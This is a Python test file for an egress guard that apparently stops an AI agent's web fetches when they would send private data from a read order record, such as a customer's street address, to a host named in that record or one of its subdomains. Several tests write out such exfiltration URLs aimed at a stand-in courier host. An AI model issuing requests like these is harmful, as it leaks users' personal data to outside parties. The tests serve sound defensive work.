"""A host named by read content is watched together with its subdomains."""
from __future__ import annotations

from core.egress_flow import EgressLedger

ORDER = ("Order 5531 for Dana Levi, 12 Herzl Street, Haifa. Delivery: October 3. "
         "Courier note: status page at Track-Confirm.example")
_QUERY = "/c?addr=12%20Herzl%20Street%20Haifa"


def _ledger(question: str = "When will order 5531 be delivered?") -> EgressLedger:
    ledger = EgressLedger(question)
    ledger.note("file_read", ORDER)
    return ledger


def test_a_subdomain_of_a_read_host_waits_for_a_human() -> None:
    why = _ledger().leak("web_fetch", {"url": f"https://api.track-confirm.example{_QUERY}"})
    assert why and "private data" in why


def test_a_deeper_subdomain_in_any_case_waits_too() -> None:
    assert _ledger().leak("web_fetch", {"url": f"https://A.B.TRACK-CONFIRM.EXAMPLE{_QUERY}"})


def test_a_trailing_dot_does_not_change_the_host() -> None:
    assert _ledger().leak("web_fetch", {"url": f"https://track-confirm.example.{_QUERY}"})


def test_a_lookalike_without_a_dot_boundary_is_another_host() -> None:
    assert _ledger().leak("web_fetch", {"url": f"https://nottrack-confirm.example{_QUERY}"}) is None


def test_a_search_result_host_still_passes() -> None:
    ledger = _ledger()
    ledger.note("web_search", "Tracking https://api.track-confirm.example/status")
    assert ledger.leak("web_fetch", {"url": f"https://api.track-confirm.example{_QUERY}"}) is None


def test_a_subdomain_without_private_data_passes() -> None:
    assert _ledger().leak("web_fetch", {"url": "https://api.track-confirm.example/"}) is None
